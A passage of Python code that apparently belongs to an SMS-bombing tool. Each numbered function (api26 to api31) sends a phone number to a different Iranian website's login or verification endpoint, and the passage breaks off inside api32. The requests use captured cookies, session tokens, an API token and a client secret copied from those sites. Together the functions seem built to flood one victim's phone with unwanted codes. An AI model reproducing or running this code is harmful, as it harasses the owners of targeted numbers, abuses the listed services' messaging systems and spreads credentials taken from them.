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',
        '__VIEWSTATEGENERATOR': '5DD0000E',
        '__VIEWSTATEENCRYPTED': '',
        '__PREVIOUSPAGE': 'PfFhDr8ugi5h4vfIVDeHhSqYDhTkDfgp5W5Te8vQgeUuzd1GF97mDqalP1VEBPl50-RfCCBq_X9JJ7M1-AQEdLsrV_OVoJYlyKQtszB1C3U1',
        '__EVENTVALIDATION': 'EqhRiEcxUeJpHKbYhNH7Q52THwPCtJgUkdTCmRGuaJDXdu6/vAFMM4TxL9AONWLf81ksPLbXANIb3nCqqXQpgqkrEuzR9/xXUdf7GgXbg52f1wTLy7tyEA/w+5pfdmXZSvJ0/deuj6Fcyin3IoLda9iBjMu0j7v9VwdeH5s+eWORZ43UNUNsiAncMl0tTp5bJUSzyT9SOs+g8KTNeY9YpKzElDXlPk44dvvMR8Q3G8yUyNqUT+3Htn/YaByyZAkF4Ud1DYkOinLYixWtm4GPTI1F/Eu8oRuPdxivM3M+BoY=',
        'ctl00$ContentPlaceHolder1$Textbox_mobile_number': number,
        'ctl00$ContentPlaceHolder1$Textbox_mobile_number2': '',
        'ctl00$TextBox_searchd': '',
        '__ASYNCPOST': 'true',
        'ctl00$ContentPlaceHolder1$Button_sendKod': '\u0627\u0631\u0633\u0627\u0644 \u06A9\u062F \u062A\u0627\u06CC\u06CC\u062F',
    }

    response = requests.post('https://digiyazd.com/logindigiyazd', headers=headers, cookies=cookies, data=data)
    print(response.url)


def api27(number):
    headers = {
        'authority': 'restaurant.delino.com',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'accept': 'application/json',
        'cache-control': 'no-cache',
        # Already added when you pass json=
        # 'content-type': 'application/json',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'origin': 'https://www.nesengrill.ir',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://www.nesengrill.ir/',
        'accept-language': 'en-US,en;q=0.9',
    }

    json_data = {
        'apiToken': 'GAbsdbjms1fx2ow35UnRCxxIbYPaNTfbq67clc9r09TtjqcxzrAbNFLTNSRFLJZZ',
        'clientSecret': 'gK6flStcuutxn82oGDqGqFqrvDTTQEZ2',
        'device': 'web',
        'username': number,
    }

    response = requests.post('https://restaurant.delino.com/user/register', headers=headers, json=json_data)
    print(response.url)


def api28(number):
    headers = {
        'authority': 'admin.zoodex.ir',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'vue': '1',
        'sec-ch-ua-mobile': '?0',
        'authorization': 'Bearer null',
        'content-type': 'application/json;charset=UTF-8',
        'accept': 'application/json',
        'device': '1',
        'client-id': 'mobit_web',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        'os': '3',
        'sec-ch-ua-platform': '"Windows"',
        'origin': 'https://zoodex.ir',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://zoodex.ir/',
        'accept-language': 'en-US,en;q=0.9',
    }

    data = {"mobile": number}

    response = requests.post('https://admin.zoodex.ir/api/v1/check-mobile', headers=headers, json=data)
    print(response.url)


def api29(number):
    cookies = {
        'rl_user_id': 'RudderEncrypt%3AU2FsdGVkX19PngkJyfMt6KFLFudTqZ8oD%2FHgCPzP%2BdA%3D',
        'rl_anonymous_id': 'RudderEncrypt%3AU2FsdGVkX1%2FD%2F0ocUBhcsEUMirkCVsCJYpv4JHrnitx1pYeUhse2WTkP8rVMp%2Ba96gFzgmXy2A9plhN3SGFFWA%3D%3D',
        'rl_group_id': 'RudderEncrypt%3AU2FsdGVkX18%2FeePVPh5OYM79TLVMQ8m9bvBzfLKDGS8%3D',
        'rl_trait': 'RudderEncrypt%3AU2FsdGVkX1%2BfinadXv95U8BCojLLmcSbpJAUWTsYIxA%3D',
        'rl_group_trait': 'RudderEncrypt%3AU2FsdGVkX19lhBYqL3XOPWa2Fqn3x5BVYyiODF9X7gA%3D',
        'rl_page_init_referrer': 'RudderEncrypt%3AU2FsdGVkX1%2FRr1HE0rbZJteg3UjRBvt5mup8eKe4OBw%3D',
        'rl_page_init_referring_domain': 'RudderEncrypt%3AU2FsdGVkX19ILH%2FuSELFM%2FuIpDA8thyBWX%2FZWjO2WBU%3D',
        'JSESSIONID': '313688588538E9F96A4E57E0553C5FBD',
        '_gcl_au': '1.1.1068681198.1648408894',
        '_anonymousUid': '1d0ef8a9-f002-4e95-b058-a90ea085bdbe',
        '_ga': 'GA1.2.619123619.1648408894',
        '_gid': 'GA1.2.757639760.1648408894',
        '_gat_gtag_UA_140014518_1': '1',
    }

    headers = {
        'Connection': 'keep-alive',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'X-Anonymous-Id': '58c6085a-2157-4ccb-8d10-8e69821ef4f3',
        'sec-ch-ua-mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        'Content-Type': 'application/json;charset=UTF-8',
        'X-Anonymous-Uid': '1d0ef8a9-f002-4e95-b058-a90ea085bdbe',
        'X-Client': 'web',
        'sec-ch-ua-platform': '"Windows"',
        'Accept': '*/*',
        'Origin': 'https://pinket.com',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://pinket.com/auth/phoneNumber',
        'Accept-Language': 'en-US,en;q=0.9',
        # Requests sorts cookies= alphabetically
        # 'Cookie': 'rl_user_id=RudderEncrypt%3AU2FsdGVkX19PngkJyfMt6KFLFudTqZ8oD%2FHgCPzP%2BdA%3D; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX1%2FD%2F0ocUBhcsEUMirkCVsCJYpv4JHrnitx1pYeUhse2WTkP8rVMp%2Ba96gFzgmXy2A9plhN3SGFFWA%3D%3D; rl_group_id=RudderEncrypt%3AU2FsdGVkX18%2FeePVPh5OYM79TLVMQ8m9bvBzfLKDGS8%3D; rl_trait=RudderEncrypt%3AU2FsdGVkX1%2BfinadXv95U8BCojLLmcSbpJAUWTsYIxA%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX19lhBYqL3XOPWa2Fqn3x5BVYyiODF9X7gA%3D; rl_page_init_referrer=RudderEncrypt%3AU2FsdGVkX1%2FRr1HE0rbZJteg3UjRBvt5mup8eKe4OBw%3D; rl_page_init_referring_domain=RudderEncrypt%3AU2FsdGVkX19ILH%2FuSELFM%2FuIpDA8thyBWX%2FZWjO2WBU%3D; JSESSIONID=313688588538E9F96A4E57E0553C5FBD; _gcl_au=1.1.1068681198.1648408894; _anonymousUid=1d0ef8a9-f002-4e95-b058-a90ea085bdbe; _ga=GA1.2.619123619.1648408894; _gid=GA1.2.757639760.1648408894; _gat_gtag_UA_140014518_1=1',
    }

    data = {"phoneNumber": number}

    response = requests.post('https://pinket.com/api/cu/v2/phone-verification', headers=headers, cookies=cookies,
                             json=data)
    print(response.url)


def api30(number):
    cookies = {
        '_ga': 'GA1.2.765239209.1648409007',
        '_gid': 'GA1.2.2050946362.1648409007',
        '_gat': '1',
        '_ym_uid': '164840900721070080',
        '_ym_d': '1648409007',
        'analytics_campaign': '{%22source%22:%22direct%22%2C%22medium%22:null}',
        'analytics_token': '1ad86399-053c-ac48-30e7-b713d93afebf',
        'analytics_session_token': '442415cb-9f65-a0ae-6e37-2fd30579a04b',
        'yektanet_session_last_activity': '3/27/2022',
        '_yngt_iframe': '1',
        '_yngt': '31f33bf3-36005-5f720-06764-4d720f2d761ce',
        '_ym_visorc': 'w',
        '_ym_isad': '2',
        'XSRF-TOKEN': 'eyJpdiI6ImRISlEwOTQxeDZuUkJ0VEZ0dUZtcFE9PSIsInZhbHVlIjoiZXhpcmgyZm16QmNTendOV3lrTnByWnZhSHlCWDJGdG5YYmNKVGVRMlBIYmVRZ3lhVll3M1prMllcL2pMc000RkFON1pUUVwvZmU4MENRcFVOSWpUT1M3Zz09IiwibWFjIjoiMzYxMzI2MzY5MGY0MTY4ZjdmOGMzYmIxMTc5NTQxOWNlMjcyZGFkY2NmYmZkN2YzOTI2MmQ4NTI4MWFlMzBlNyJ9',
        'laravel_session': 'eyJpdiI6Im9YM3h4MDRcL2NSU2ZtRktyaDJwTTZnPT0iLCJ2YWx1ZSI6IlpIZjhEbjdHOExucTFcL0ltd1VvbW9iQlhSdFh0N1UwS2ZrcXZHT3dheU5lQkhFNllNanFCc0hWdEdJVnJtK0xcL0VOWFB6NUx4YjZ3S3BCaGVhYmdMVGc9PSIsIm1hYyI6ImQzMTM3NGY2MjI1OGJmZTg2YWIzNWZiNDQ3M2I0ZDM1YzdmMTliYTBhMWFkMDQ5OGJiNWJiZDZkYTRlNWQ2MDgifQ%3D%3D',
    }

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'Upgrade-Insecure-Requests': '1',
        'Origin': 'https://miveplus.com',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Referer': 'https://miveplus.com/login',
        'Accept-Language': 'en-US,en;q=0.9',
        # Requests sorts cookies= alphabetically
        # 'Cookie': '_ga=GA1.2.765239209.1648409007; _gid=GA1.2.2050946362.1648409007; _gat=1; _ym_uid=164840900721070080; _ym_d=1648409007; analytics_campaign={%22source%22:%22direct%22%2C%22medium%22:null}; analytics_token=1ad86399-053c-ac48-30e7-b713d93afebf; analytics_session_token=442415cb-9f65-a0ae-6e37-2fd30579a04b; yektanet_session_last_activity=3/27/2022; _yngt_iframe=1; _yngt=31f33bf3-36005-5f720-06764-4d720f2d761ce; _ym_visorc=w; _ym_isad=2; XSRF-TOKEN=eyJpdiI6ImRISlEwOTQxeDZuUkJ0VEZ0dUZtcFE9PSIsInZhbHVlIjoiZXhpcmgyZm16QmNTendOV3lrTnByWnZhSHlCWDJGdG5YYmNKVGVRMlBIYmVRZ3lhVll3M1prMllcL2pMc000RkFON1pUUVwvZmU4MENRcFVOSWpUT1M3Zz09IiwibWFjIjoiMzYxMzI2MzY5MGY0MTY4ZjdmOGMzYmIxMTc5NTQxOWNlMjcyZGFkY2NmYmZkN2YzOTI2MmQ4NTI4MWFlMzBlNyJ9; laravel_session=eyJpdiI6Im9YM3h4MDRcL2NSU2ZtRktyaDJwTTZnPT0iLCJ2YWx1ZSI6IlpIZjhEbjdHOExucTFcL0ltd1VvbW9iQlhSdFh0N1UwS2ZrcXZHT3dheU5lQkhFNllNanFCc0hWdEdJVnJtK0xcL0VOWFB6NUx4YjZ3S3BCaGVhYmdMVGc9PSIsIm1hYyI6ImQzMTM3NGY2MjI1OGJmZTg2YWIzNWZiNDQ3M2I0ZDM1YzdmMTliYTBhMWFkMDQ5OGJiNWJiZDZkYTRlNWQ2MDgifQ%3D%3D',
    }

    data = {
        '_token': '7igF9lMbcQ1HxuC0NIiTW2zwLM7476d0s98dwiXE',
        'phone': number,
    }

    response = requests.post('https://miveplus.com/login', headers=headers, cookies=cookies, data=data)
    print(response.url)


def api31(number):
    cookies = {
        '_gcl_au': '1.1.1727109356.1648409177',
        '_ga': 'GA1.2.278162333.1648409178',
        '_gid': 'GA1.2.1971157930.1648409178',
        '_gat_UA-118966409-1': '1',
        'crisp-client%2Fsession%2F398f1fe9-b4c3-4f7f-b4fc-4bcbe7bcce8f': 'session_26988ada-508b-481e-a842-d465eb16c2aa',
        'analytics_campaign': '{%22source%22:%22direct%22%2C%22medium%22:null}',
        'analytics_token': 'c471c904-9ea9-01c2-ca2c-d94ad57e4735',
        'analytics_session_token': '034818ea-c98d-7afa-944b-8979862a6a97',
        'yektanet_session_last_activity': '3/27/2022',
        '_yngt_iframe': '1',
        '_yngt': '31f33bf3-36005-5f720-06764-4d720f2d761ce',
        '_600e86c21684606de178cb52': 'true',
    }

    headers = {
        'authority': 'sabziman.com',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'x-requested-with': 'XMLHttpRequest',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'origin': 'https://sabziman.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://sabziman.com/',
        'accept-language': 'en-US,en;q=0.9',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_gcl_au=1.1.1727109356.1648409177; _ga=GA1.2.278162333.1648409178; _gid=GA1.2.1971157930.1648409178; _gat_UA-118966409-1=1; crisp-client%2Fsession%2F398f1fe9-b4c3-4f7f-b4fc-4bcbe7bcce8f=session_26988ada-508b-481e-a842-d465eb16c2aa; analytics_campaign={%22source%22:%22direct%22%2C%22medium%22:null}; analytics_token=c471c904-9ea9-01c2-ca2c-d94ad57e4735; analytics_session_token=034818ea-c98d-7afa-944b-8979862a6a97; yektanet_session_last_activity=3/27/2022; _yngt_iframe=1; _yngt=31f33bf3-36005-5f720-06764-4d720f2d761ce; _600e86c21684606de178cb52=true',
    }

    data = {
        'action': 'newphoneexist',
        'phonenumber': number,
    }

    response = requests.post('https://sabziman.com/wp-admin/admin-ajax.php', headers=headers, cookies=cookies,
                             data=data)
    print(response.url)


def api32(number):
    headers = {
        'authority': 'application2.billingsystem.ayantech.ir',
